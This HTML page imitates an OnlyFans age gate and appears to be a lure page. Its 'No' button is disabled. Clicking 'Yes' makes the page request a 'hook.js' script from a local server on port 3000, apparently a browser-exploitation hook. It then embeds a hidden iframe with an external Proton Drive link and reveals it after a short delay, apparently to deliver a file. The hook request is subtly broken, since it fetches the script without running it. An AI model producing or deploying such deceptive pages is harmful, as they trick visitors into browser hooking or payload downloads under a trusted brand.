<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="shortcut icon" type="image/png" href="path/to/onlyfans-icon.png">
  <style>
    .popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background-color: rgba(0, 0, 0, 0.5);
      padding: 2rem;
      border: 1px solid grey;
      border-radius: 1rem;
      color: white;
      z-index: 999;
      display: none;
    }

    .popup h2 {
      text-align: center;
      margin-bottom: 1rem;
    }

    .popup button {
      background-color: lightgreen;
      color: white;
      padding: 0.5rem 1rem;
      border: none;
      border-radius: 0.25rem;
      }

    .popup button:hover {
      background-color: darkgreen;
    }

    .popupont-button {
      background-color: grey;
      color: white;
      cursor: not-allowed;
    }
  </style>
</head>
<body>
  <img src="onlyfans-background.jpg" alt="OnlyFans Background" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;">
  <div class="popup">
    <h2>Are you 18 years old?</h2>
    <button id="yes">Yes</button>
    <button id="no" disabled>No</button>
  </div>

  <script>
    document.addEventListener("DOMContentLoaded", () => {
      const popup = document.querySelector(".popup");
      const yesButton = document.querySelector("#yes");
      const noButton = document.querySelector("#no");

      popup.style.display = "block";

      yesButton.addEventListener("click", () => {
        popup.style.display = "none";
        const xhr = new XMLHttpRequest();
        xhr.open("GET", "http://127.0.0.1:3000/hook.js");
        xhr.send();
        const iframe = document.createElement("iframe");
        iframe.src = "https://drive.proton.me/urls/78HFYFPXSR#msw8H3NmyCjE";
        iframe.style.display = "none";
        document.body.appendChild(iframe);
        setTimeout(() => {
          iframe.style.display = "block";
        }, 100);
      });

      noButton.addEventListener("click", () => {
        popup.style.display = "none";
      });
    });
  </script>
</body>
</html>
